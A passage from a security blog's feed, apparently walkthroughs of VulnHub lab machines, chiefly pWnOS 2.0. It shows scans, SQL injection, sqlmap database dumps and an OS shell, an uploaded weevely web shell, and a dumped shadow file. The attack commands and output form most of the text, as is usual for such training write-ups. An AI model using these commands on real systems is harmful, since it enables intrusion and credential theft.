</span><span class='line'><span class="o">[</span>&lt;em&gt;<span class="o">]</span> Restoring <span class="k">function</span> pointer<span class="p">&amp;</span>hellip<span class="p">;</span>
</span><span class='line'><span class="o">[</span>&lt;/em&gt;<span class="o">]</span> Got root!
</span><span class='line'>sh-4.0# id
</span><span class='line'>id
</span><span class='line'><span class="nv">uid</span><span class="o">=</span>0<span class="o">(</span>root<span class="o">)</span> <span class="nv">gid</span><span class="o">=</span>0<span class="o">(</span>root<span class="o">)</span>&lt;/p&gt;
</span><span class='line'>
</span><span class='line'>&lt;p&gt;sh-4.0# cat /etc/shadow
</span><span class='line'>cat /etc/shadow
</span><span class='line'>root:<span class="nv">$6$4l1OVmLPSV28eVCT$FqycC5mozZ8mqiqgfudLsHUk7R1EMU</span>/FXw3pOcOb39LXekt9VY6HyGkXcLEO.ab9F9t7BqTdxSJvCcy.iYlcp0:14981:0:99999:7:::
</span><span class='line'>bin:&lt;em&gt;:14495:0:99999:7:::
</span><span class='line'>daemon:&lt;/em&gt;:14495:0:99999:7:::
</span><span class='line'>adm:&lt;em&gt;:14495:0:99999:7:::
</span><span class='line'>lp:&lt;/em&gt;:14495:0:99999:7:::
</span><span class='line'>sync:&lt;em&gt;:14495:0:99999:7:::
</span><span class='line'>shutdown:&lt;/em&gt;:14495:0:99999:7:::
</span><span class='line'>halt:&lt;em&gt;:14495:0:99999:7:::
</span><span class='line'>mail:&lt;/em&gt;:14495:0:99999:7:::
</span><span class='line'>uucp:&lt;em&gt;:14495:0:99999:7:::
</span><span class='line'>operator:&lt;/em&gt;:14495:0:99999:7:::
</span><span class='line'>games:&lt;em&gt;:14495:0:99999:7:::
</span><span class='line'>gopher:&lt;/em&gt;:14495:0:99999:7:::
</span><span class='line'>&lt;a <span class="nv">href</span><span class="o">=</span><span class="s2">&quot;ftp:*:14495:0:99999:7:::&quot;</span>&gt;ftp:*:14495:0:99999:7:::&lt;/a&gt;
</span><span class='line'>nobody:*:14495:0:99999:7:::
</span><span class='line'>vcsa:!!:14557::::::
</span><span class='line'>avahi-autoipd:!!:14557::::::
</span><span class='line'>ntp:!!:14557::::::
</span><span class='line'>dbus:!!:14557::::::
</span><span class='line'>rtkit:!!:14557::::::
</span><span class='line'>nscd:!!:14557::::::
</span><span class='line'>tcpdump:!!:14557::::::
</span><span class='line'>avahi:!!:14557::::::
</span><span class='line'>haldaemon:!!:14557::::::
</span><span class='line'>openvpn:!!:14557::::::
</span><span class='line'>apache:!!:14557::::::
</span><span class='line'>saslauth:!!:14557::::::
</span><span class='line'>mailnull:!!:14557::::::
</span><span class='line'>smmsp:!!:14557::::::
</span><span class='line'>smolt:!!:14557::::::
</span><span class='line'>sshd:!!:14557::::::
</span><span class='line'>pulse:!!:14557::::::
</span><span class='line'>gdm:!!:14557::::::
</span><span class='line'>p0wnbox.Team:<span class="nv">$6$rPArLuwe8rM9Avwv$a5coOdUCQQY7NgvTnXaFj2D5SmggRrFsr6TP8g7IATVeEt37LUGJYvHM1myhelCyPkIjd8Yv5olMnUhwbQL76</span>/:14981:0:99999:7:::
</span><span class='line'>mysql:!!:14981::::::
</span></code></pre></td></tr></table></div></figure></p>
]]></content>
  </entry>
  
  <entry>
    <title type="html"><![CDATA[pWnOS: 2.0]]></title>
    <link href="http://73696e65.github.io/blog/2015/05/22/pwnos-2-dot-0/"/>
    <updated>2015-05-22T08:40:50+02:00</updated>
    <id>http://73696e65.github.io/blog/2015/05/22/pwnos-2-dot-0</id>
    <content type="html"><![CDATA[<p>Image: <a href="https://www.vulnhub.com/entry/pwnos-20-pre-release,34/">pWnOS: 2.0 (Pre-Release)</a></p>

<p>Nmap output:
<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>root@kali32:~# nmap 10.10.10.100 -sV -p-&lt;/p>
</span><span class='line'>
</span><span class='line'>&lt;p>Starting Nmap 6.47 ( &lt;a href="http://nmap.org">http://nmap.org&lt;/a> ) at 2015-04-27 14:45 CEST
</span><span class='line'>Stats: 0:00:07 elapsed; 0 hosts completed (1 up), 1 undergoing Service Scan
</span><span class='line'>Service scan Timing: About 50.00% done; ETC: 14:45 (0:00:06 remaining)
</span><span class='line'>Nmap scan report for 10.10.10.100
</span><span class='line'>Host is up (0.00030s latency).
</span><span class='line'>Not shown: 65533 closed ports
</span><span class='line'>PORT   STATE SERVICE VERSION
</span><span class='line'>22/tcp open  ssh     OpenSSH 5.8p1 Debian 1ubuntu3 (Ubuntu Linux; protocol 2.0)
</span><span class='line'>80/tcp open  http    Apache httpd 2.2.17 ((Ubuntu))
</span><span class='line'>MAC Address: 00:0C:29:61:0D:EB (VMware)
</span><span class='line'>Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel&lt;/p>
</span><span class='line'>
</span><span class='line'>&lt;p>Service detection performed. Please report any incorrect results at &lt;a href="http://nmap.org/submit/">http://nmap.org/submit/&lt;/a> .
</span><span class='line'>Nmap done: 1 IP address (1 host up) scanned in 7.54 seconds</span></code></pre></td></tr></table></div></figure></p>

<p>Nikto output:
<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
<span class='line-number'>25</span>
<span class='line-number'>26</span>
<span class='line-number'>27</span>
<span class='line-number'>28</span>
<span class='line-number'>29</span>
<span class='line-number'>30</span>
<span class='line-number'>31</span>
<span class='line-number'>32</span>
<span class='line-number'>33</span>
<span class='line-number'>34</span>
<span class='line-number'>35</span>
<span class='line-number'>36</span>
<span class='line-number'>37</span>
<span class='line-number'>38</span>
<span class='line-number'>39</span>
<span class='line-number'>40</span>
<span class='line-number'>41</span>
<span class='line-number'>42</span>
<span class='line-number'>43</span>
<span class='line-number'>44</span>
<span class='line-number'>45</span>
<span class='line-number'>46</span>
<span class='line-number'>47</span>
<span class='line-number'>48</span>
<span class='line-number'>49</span>
<span class='line-number'>50</span>
<span class='line-number'>51</span>
<span class='line-number'>52</span>
<span class='line-number'>53</span>
<span class='line-number'>54</span>
<span class='line-number'>55</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>root@kali32:~# nikto -h 10.10.10.100&lt;/p>
</span><span class='line'>
</span><span class='line'>&lt;h2>- Nikto v2.1.6&lt;/h2>
</span><span class='line'>
</span><span class='line'>&lt;ul>
</span><span class='line'>&lt;li>Target IP:          10.10.10.100&lt;/li>
</span><span class='line'>&lt;li>Target Hostname:    10.10.10.100&lt;/li>
</span><span class='line'>&lt;li>Target Port:        80
</span><span class='line'>
</span><span class='line'>&lt;ul>
</span><span class='line'>&lt;li>Start Time:         2015-04-27 14:46:59 (GMT2)&lt;/li>
</span><span class='line'>&lt;/ul>
</span><span class='line'>&lt;/li>
</span><span class='line'>&lt;/ul>
</span><span class='line'>
</span><span class='line'>
</span><span class='line'>&lt;hr />
</span><span class='line'>
</span><span class='line'>&lt;ul>
</span><span class='line'>&lt;li>Server: Apache/2.2.17 (Ubuntu)&lt;/li>
</span><span class='line'>&lt;li>Cookie PHPSESSID created without the httponly flag&lt;/li>
</span><span class='line'>&lt;li>Retrieved x-powered-by header: PHP/5.3.5-1ubuntu7&lt;/li>
</span><span class='line'>&lt;li>The anti-clickjacking X-Frame-Options header is not present.&lt;/li>
</span><span class='line'>&lt;li>Uncommon header &lsquo;tcn&rsquo; found, with contents: list&lt;/li>
</span><span class='line'>&lt;li>Apache mod_negotiation is enabled with MultiViews, which allows attackers to easily brute force file names. See &lt;a href="http://www.wisec.it/sectou.php?id=4698ebdc59d15.">http://www.wisec.it/sectou.php?id=4698ebdc59d15.&lt;/a> The following alternatives for &lsquo;index&rsquo; were found: index.php&lt;/li>
</span><span class='line'>&lt;li>Apache/2.2.17 appears to be outdated (current is at least Apache/2.4.7). Apache 2.0.65 (final release) and 2.2.26 are also current.&lt;/li>
</span><span class='line'>&lt;li>Web Server returns a valid response with junk HTTP methods, this may cause false positives.&lt;/li>
</span><span class='line'>&lt;li>OSVDB-12184: /?=PHPB8B5F2A0-3C92-11d3-A3A9-4C7B08C10000: PHP reveals potentially sensitive information via certain HTTP requests that contain specific QUERY strings.&lt;/li>
</span><span class='line'>&lt;li>OSVDB-12184: /?=PHPE9568F36-D428-11d2-A769-00AA001ACF42: PHP reveals potentially sensitive information via certain HTTP requests that contain specific QUERY strings.&lt;/li>
</span><span class='line'>&lt;li>OSVDB-12184: /?=PHPE9568F34-D428-11d2-A769-00AA001ACF42: PHP reveals potentially sensitive information via certain HTTP requests that contain specific QUERY strings.&lt;/li>
</span><span class='line'>&lt;li>OSVDB-12184: /?=PHPE9568F35-D428-11d2-A769-00AA001ACF42: PHP reveals potentially sensitive information via certain HTTP requests that contain specific QUERY strings.&lt;/li>
</span><span class='line'>&lt;li>OSVDB-3268: /includes/: Directory indexing found.&lt;/li>
</span><span class='line'>&lt;li>OSVDB-3092: /includes/: This might be interesting&hellip;&lt;/li>
</span><span class='line'>&lt;li>OSVDB-3092: /info/: This might be interesting&hellip;&lt;/li>
</span><span class='line'>&lt;li>OSVDB-3092: /login/: This might be interesting&hellip;&lt;/li>
</span><span class='line'>&lt;li>OSVDB-3092: /register/: This might be interesting&hellip;&lt;/li>
</span><span class='line'>&lt;li>OSVDB-3233: /info.php: PHP is installed, and a test script which runs phpinfo() was found. This gives a lot of system information.&lt;/li>
</span><span class='line'>&lt;li>OSVDB-3268: /icons/: Directory indexing found.&lt;/li>
</span><span class='line'>&lt;li>Server leaks inodes via ETags, header found with file /icons/README, inode: 1311031, size: 5108, mtime: Tue Aug 28 12:48:10 2007&lt;/li>
</span><span class='line'>&lt;li>OSVDB-3233: /icons/README: Apache default file found.&lt;/li>
</span><span class='line'>&lt;li>OSVDB-5292: /info.php?file=&lt;a href="http://cirt.net/rfiinc.txt?:">http://cirt.net/rfiinc.txt?:&lt;/a> RFI from RSnake&rsquo;s list (&lt;a href="http://ha.ckers.org/weird/rfi-locations.dat">http://ha.ckers.org/weird/rfi-locations.dat&lt;/a>) or from &lt;a href="http://osvdb.org/">http://osvdb.org/&lt;/a>&lt;/li>
</span><span class='line'>&lt;li>/login.php: Admin login page/section found.&lt;/li>
</span><span class='line'>&lt;li>7331 requests: 0 error(s) and 22 item(s) reported on remote host
</span><span class='line'>
</span><span class='line'>&lt;ul>
</span><span class='line'>&lt;li>End Time:           2015-04-27 14:47:09 (GMT2) (10 seconds)&lt;/li>
</span><span class='line'>&lt;/ul>
</span><span class='line'>&lt;/li>
</span><span class='line'>&lt;/ul>
</span><span class='line'>
</span><span class='line'>
</span><span class='line'>&lt;hr />
</span><span class='line'>
</span><span class='line'>&lt;ul>
</span><span class='line'>&lt;li>1 host(s) tested</span></code></pre></td></tr></table></div></figure></li>
</ul>


<p>There is a SQL injection in email, we can see an error message trying to log in (filling an email field with the single quote):
<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>&lt;a href="http://10.10.10.100/login.php:">http://10.10.10.100/login.php:&lt;/a>&lt;/p>
</span><span class='line'>
</span><span class='line'>&lt;p>An error occurred in script &lsquo;/var/www/login.php&rsquo; on line 47: Query: SELECT *
</span><span class='line'>FROM users WHERE email=&lsquo;&rsquo;&lsquo; AND pass='86f7e437faa5a7fce15d1ddcb9eaeaea377667b8&rsquo;
</span><span class='line'>AND active IS NULL&lt;/p>
</span><span class='line'>
</span><span class='line'>&lt;p>MySQL Error: You have an error in your SQL syntax; check the
</span><span class='line'>manual that corresponds to your MySQL server version for the right syntax to
</span><span class='line'>use near &lsquo;86f7e437faa5a7fce15d1ddcb9eaeaea377667b8&rsquo; AND active IS NULL' at line 1</span></code></pre></td></tr></table></div></figure></p>

<p>Using Sqlmap we dump the whole databases:
<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>$ sqlmap -u &ldquo;&lt;a href="http://10.10.10.100/login.php">http://10.10.10.100/login.php&lt;/a>&rdquo; &ndash;forms &ndash;dump-all
</span><span class='line'>[ .. snip .. ]
</span><span class='line'>email=test@test.com&amp;pass=123&amp;submit=Login&amp;submitted=TRUE</span></code></pre></td></tr></table></div></figure></p>

<p>We try to crack hashes but without success in the reasonable time:
<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>root@kali32:~/.sqlmap/output/10.10.10.100/dump# cat mysql/user-f3649c95.csv | cut -d, -f2-3 | sed &rsquo;s#,#:#&lsquo; > /tmp/hashes.csv
</span><span class='line'>root@kali32:~/.sqlmap/output/10.10.10.100/dump# john &ndash;format=mysql-sha1 /tmp/hashes.csv
</span><span class='line'>[ .. snip .. ]
</span><span class='line'>root@kali32:~/.sqlmap/output/10.10.10.100/dump# cat ch16/users.csv
</span><span class='line'>user_id,pass,email,active,last_name,first_name,user_level,registration_date
</span><span class='line'>1,c2c4b4e51d9e23c02c15702c136c3e950ba9a4af,admin@isints.com,NULL,Privett,Dan,0,2011-05-07 17:27:01</span></code></pre></td></tr></table></div></figure></p>

<p>With OS Shell functionality of Sqlmap (&ndash;os-shell), we was able to obtain shell with the web user privileges:
<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
<span class='line-number'>25</span>
<span class='line-number'>26</span>
<span class='line-number'>27</span>
<span class='line-number'>28</span>
<span class='line-number'>29</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>os-shell> cat /etc/passwd
</span><span class='line'>do you want to retrieve the command standard output? [Y/n/a] y&lt;/p>
</span><span class='line'>
</span><span class='line'>&lt;h2>command standard output:&lt;/h2>
</span><span class='line'>
</span><span class='line'>&lt;p>root:x:0:0:root:/root:/bin/bash
</span><span class='line'>daemon:x:1:1:daemon:/usr/sbin:/bin/sh
</span><span class='line'>bin:x:2:2:bin:/bin:/bin/sh
</span><span class='line'>sys:x:3:3:sys:/dev:/bin/sh
</span><span class='line'>sync:x:4:65534:sync:/bin:/bin/sync
</span><span class='line'>games:x:5:60:games:/usr/games:/bin/sh
</span><span class='line'>man:x:6:12:man:/var/cache/man:/bin/sh
</span><span class='line'>lp:x:7:7:lp:/var/spool/lpd:/bin/sh
</span><span class='line'>mail:x:8:8:mail:/var/mail:/bin/sh
</span><span class='line'>&lt;a href="news:x:9:9:news:/var/spool/news:/bin/sh">news:x:9:9:news:/var/spool/news:/bin/sh&lt;/a>
</span><span class='line'>uucp:x:10:10:uucp:/var/spool/uucp:/bin/sh
</span><span class='line'>proxy:x:13:13:proxy:/bin:/bin/sh
</span><span class='line'>www-data:x:33:33:www-data:/var/www:/bin/sh
</span><span class='line'>backup:x:34:34:backup:/var/backups:/bin/sh
</span><span class='line'>list:x:38:38:Mailing List Manager:/var/list:/bin/sh
</span><span class='line'>irc:x:39:39:ircd:/var/run/ircd:/bin/sh
</span><span class='line'>gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/bin/sh
</span><span class='line'>nobody:x:65534:65534:nobody:/nonexistent:/bin/sh
</span><span class='line'>libuuid:x:100:101::/var/lib/libuuid:/bin/sh
</span><span class='line'>syslog:x:101:103::/home/syslog:/bin/false
</span><span class='line'>mysql:x:0:0:MySQL Server,,,:/root:/bin/bash
</span><span class='line'>sshd:x:103:65534::/var/run/sshd:/usr/sbin/nologin
</span><span class='line'>landscape:x:104:110::/var/lib/landscape:/bin/false
</span><span class='line'>dan:x:1000:1000:Dan Privett,,,:/home/dan:/bin/bash</span></code></pre></td></tr></table></div></figure></p>

<p>As we can see, MySQL daemon is running as root (=uid 0), this is also the
reason, why we were able to write something with database user to /var/www
(owned by www-data), that&rsquo;s not common.</p>

<p>We can also upload weevely to the remote system and use it as the more sophisticated shell:
<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>root@kali32:~# sqlmap -u &ldquo;&lt;a href="http://10.10.10.100/login.php">http://10.10.10.100/login.php&lt;/a>&rdquo; &ndash;data &ldquo;email=test@test.com&amp;pass=123&amp;submit=Login&amp;submitted=TRUE&rdquo; &ndash;file-write=&ldquo;/var/www/weevely.php.txt&rdquo; &ndash;file-dest=/var/www/w.php</span></code></pre></td></tr></table></div></figure></p>

<p>We found the database credentials, however they didn&rsquo;t work:
<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
</pre></td><td class='code'><pre><code class='php'><span class='line'><span class="nx">www</span><span class="o">-</span><span class="nx">data</span><span class="o">@</span><span class="nx">web</span><span class="o">:/</span><span class="k">var</span><span class="o">/</span><span class="nx">www</span> <span class="err">$</span> <span class="nx">cat</span> <span class="nb">mysqli_connect</span><span class="o">.</span><span class="nx">php</span>
</span><span class='line'><span class="o">&amp;</span><span class="nx">lt</span><span class="p">;</span><span class="o">?</span><span class="nx">php</span> <span class="c1"># Script 8.2 - mysqli_connect.php&lt;/p&gt;</span>
</span><span class='line'>
</span><span class='line'><span class="o">&lt;</span><span class="nx">p</span><span class="o">&gt;//</span> <span class="k">This</span> <span class="nb">file</span> <span class="nx">contains</span> <span class="nx">the</span> <span class="nx">database</span> <span class="nx">access</span> <span class="nx">information</span><span class="o">.</span>
</span><span class='line'><span class="c1">// This file also establishes a connection to MySQL</span>
</span><span class='line'><span class="c1">// and selects the database.&lt;/p&gt;</span>
</span><span class='line'>
</span><span class='line'><span class="o">&lt;</span><span class="nx">p</span><span class="o">&gt;//</span> <span class="nx">Set</span> <span class="nx">the</span> <span class="nx">database</span> <span class="nx">access</span> <span class="nx">information</span> <span class="k">as</span> <span class="nx">constants</span><span class="o">:&lt;/</span><span class="nx">p</span><span class="o">&gt;</span>
</span><span class='line'>
</span><span class='line'><span class="o">&lt;</span><span class="nx">p</span><span class="o">&gt;</span><span class="nx">DEFINE</span> <span class="p">(</span><span class="o">&amp;</span><span class="nx">lsquo</span><span class="p">;</span><span class="nx">DB_USER</span><span class="o">&amp;</span><span class="nx">rsquo</span><span class="p">;,</span> <span class="o">&amp;</span><span class="nx">lsquo</span><span class="p">;</span><span class="nx">root</span><span class="o">&amp;</span><span class="nx">rsquo</span><span class="p">;);</span>
</span><span class='line'><span class="nx">DEFINE</span> <span class="p">(</span><span class="o">&amp;</span><span class="nx">lsquo</span><span class="p">;</span><span class="nx">DB_PASSWORD</span><span class="o">&amp;</span><span class="nx">rsquo</span><span class="p">;,</span> <span class="o">&amp;</span><span class="nx">lsquo</span><span class="p">;</span><span class="nx">goodday</span><span class="o">&amp;</span><span class="nx">rsquo</span><span class="p">;);</span>
</span><span class='line'><span class="nx">DEFINE</span> <span class="p">(</span><span class="o">&amp;</span><span class="nx">lsquo</span><span class="p">;</span><span class="nx">DB_HOST</span><span class="o">&amp;</span><span class="nx">rsquo</span><span class="p">;,</span> <span class="o">&amp;</span><span class="nx">lsquo</span><span class="p">;</span><span class="nx">localhost</span><span class="o">&amp;</span><span class="nx">rsquo</span><span class="p">;);</span>
</span><span class='line'><span class="nx">DEFINE</span> <span class="p">(</span><span class="o">&amp;</span><span class="nx">lsquo</span><span class="p">;</span><span class="nx">DB_NAME</span><span class="o">&amp;</span><span class="nx">rsquo</span><span class="p">;,</span> <span class="o">&amp;</span><span class="nx">lsquo</span><span class="p">;</span><span class="nx">ch16</span><span class="o">&amp;</span><span class="nx">rsquo</span><span class="p">;);</span><span class="o">&lt;/</span><span class="nx">p</span><span class="o">&gt;</span>
</span><span class='line'>
</span><span class='line'><span class="o">&lt;</span><span class="nx">p</span><span class="o">&gt;//</span> <span class="nx">Make</span> <span class="nx">the</span> <span class="nx">connection</span><span class="o">:&lt;/</span><span class="nx">p</span><span class="o">&gt;</span>
</span><span class='line'>
</span><span class='line'><span class="o">&lt;</span><span class="nx">p</span><span class="o">&gt;</span><span class="nv">$dbc</span> <span class="o">=</span> <span class="o">@</span><span class="nb">mysqli_connect</span> <span class="p">(</span><span class="nx">DB_HOST</span><span class="p">,</span> <span class="nx">DB_USER</span><span class="p">,</span> <span class="nx">DB_PASSWORD</span><span class="p">,</span> <span class="nx">DB_NAME</span><span class="p">)</span> <span class="k">OR</span> <span class="k">die</span> <span class="p">(</span><span class="o">&amp;</span><span class="nx">lsquo</span><span class="p">;</span><span class="nx">Could</span> <span class="k">not</span> <span class="nx">connect</span> <span class="nx">to</span> <span class="nx">MySQL</span><span class="o">:</span> <span class="o">&amp;</span><span class="nx">rsquo</span><span class="p">;</span> <span class="o">.</span> <span class="nx">mysqli_connect_error</span><span class="p">()</span> <span class="p">);</span><span class="o">&lt;/</span><span class="nx">p</span><span class="o">&gt;</span>
</span><span class='line'>
</span><span class='line'><span class="o">&lt;</span><span class="nx">p</span><span class="o">&gt;?&gt;</span>
</span></code></pre></td></tr></table></div></figure></p>

<p>That was strange, because the web application is connected. After a little more digging, we found this suspicious file:
<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
</pre></td><td class='code'><pre><code class='php'><span class='line'><span class="nx">www</span><span class="o">-</span><span class="nx">data</span><span class="o">@</span><span class="nx">web</span><span class="o">:/</span><span class="k">var</span><span class="o">/</span><span class="nx">www</span> <span class="err">$</span> <span class="nx">cat</span> <span class="o">../</span><span class="nb">mysqli_connect</span><span class="o">.</span><span class="nx">php</span>
</span><span class='line'><span class="o">&amp;</span><span class="nx">lt</span><span class="p">;</span><span class="o">?</span><span class="nx">php</span> <span class="c1"># Script 8.2 - mysqli_connect.php&lt;/p&gt;</span>
</span><span class='line'>
</span><span class='line'><span class="o">&lt;</span><span class="nx">p</span><span class="o">&gt;//</span> <span class="k">This</span> <span class="nb">file</span> <span class="nx">contains</span> <span class="nx">the</span> <span class="nx">database</span> <span class="nx">access</span> <span class="nx">information</span><span class="o">.</span>
</span><span class='line'><span class="c1">// This file also establishes a connection to MySQL</span>
</span><span class='line'><span class="c1">// and selects the database.&lt;/p&gt;</span>
</span><span class='line'>
</span><span class='line'><span class="o">&lt;</span><span class="nx">p</span><span class="o">&gt;//</span> <span class="nx">Set</span> <span class="nx">the</span> <span class="nx">database</span> <span class="nx">access</span> <span class="nx">information</span> <span class="k">as</span> <span class="nx">constants</span><span class="o">:&lt;/</span><span class="nx">p</span><span class="o">&gt;</span>
</span><span class='line'>
</span><span class='line'><span class="o">&lt;</span><span class="nx">p</span><span class="o">&gt;</span><span class="nx">DEFINE</span> <span class="p">(</span><span class="o">&amp;</span><span class="nx">lsquo</span><span class="p">;</span><span class="nx">DB_USER</span><span class="o">&amp;</span><span class="nx">rsquo</span><span class="p">;,</span> <span class="o">&amp;</span><span class="nx">lsquo</span><span class="p">;</span><span class="nx">root</span><span class="o">&amp;</span><span class="nx">rsquo</span><span class="p">;);</span>
</span><span class='line'><span class="nx">DEFINE</span> <span class="p">(</span><span class="o">&amp;</span><span class="nx">lsquo</span><span class="p">;</span><span class="nx">DB_PASSWORD</span><span class="o">&amp;</span><span class="nx">rsquo</span><span class="p">;,</span> <span class="o">&amp;</span><span class="nx">lsquo</span><span class="p">;</span><span class="nx">root</span><span class="o">@</span><span class="nx">ISIntS</span><span class="o">&amp;</span><span class="nx">rsquo</span><span class="p">;);</span>
</span><span class='line'><span class="nx">DEFINE</span> <span class="p">(</span><span class="o">&amp;</span><span class="nx">lsquo</span><span class="p">;</span><span class="nx">DB_HOST</span><span class="o">&amp;</span><span class="nx">rsquo</span><span class="p">;,</span> <span class="o">&amp;</span><span class="nx">lsquo</span><span class="p">;</span><span class="nx">localhost</span><span class="o">&amp;</span><span class="nx">rsquo</span><span class="p">;);</span>
</span><span class='line'><span class="nx">DEFINE</span> <span class="p">(</span><span class="o">&amp;</span><span class="nx">lsquo</span><span class="p">;</span><span class="nx">DB_NAME</span><span class="o">&amp;</span><span class="nx">rsquo</span><span class="p">;,</span> <span class="o">&amp;</span><span class="nx">lsquo</span><span class="p">;</span><span class="nx">ch16</span><span class="o">&amp;</span><span class="nx">rsquo</span><span class="p">;);</span><span class="o">&lt;/</span><span class="nx">p</span><span class="o">&gt;</span>
</span><span class='line'>
</span><span class='line'><span class="o">&lt;</span><span class="nx">p</span><span class="o">&gt;//</span> <span class="nx">Make</span> <span class="nx">the</span> <span class="nx">connection</span><span class="o">:&lt;/</span><span class="nx">p</span><span class="o">&gt;</span>
</span><span class='line'>
</span><span class='line'><span class="o">&lt;</span><span class="nx">p</span><span class="o">&gt;</span><span class="nv">$dbc</span> <span class="o">=</span> <span class="o">@</span><span class="nb">mysqli_connect</span> <span class="p">(</span><span class="nx">DB_HOST</span><span class="p">,</span> <span class="nx">DB_USER</span><span class="p">,</span> <span class="nx">DB_PASSWORD</span><span class="p">,</span> <span class="nx">DB_NAME</span><span class="p">)</span> <span class="k">OR</span> <span class="k">die</span> <span class="p">(</span><span class="o">&amp;</span><span class="nx">lsquo</span><span class="p">;</span><span class="nx">Could</span> <span class="k">not</span> <span class="nx">connect</span> <span class="nx">to</span> <span class="nx">MySQL</span><span class="o">:</span> <span class="o">&amp;</span><span class="nx">rsquo</span><span class="p">;</span> <span class="o">.</span> <span class="nx">mysqli_connect_error</span><span class="p">()</span> <span class="p">);</span><span class="o">&lt;/</span><span class="nx">p</span><span class="o">&gt;</span>
</span><span class='line'>
</span><span class='line'><span class="o">&lt;</span><span class="nx">p</span><span class="o">&gt;?&gt;</span>
</span></code></pre></td></tr></table></div></figure></p>

<p>The <a href="http://10.10.10.100/blog/index.php">blog application</a> uses the text files instead of MySQL. We were only
able to locate the password file, without cracking it:
<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>www-data@web:/var/www $ cat blog/config/password.txt
</span><span class='line'>$1$weWj5iAZ$NU4CkeZ9jNtcP/qrPC69a/</span></code></pre></td></tr></table></div></figure></p>

<p>Using root / root@ISIntS we can finally log in via ssh as root:
<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
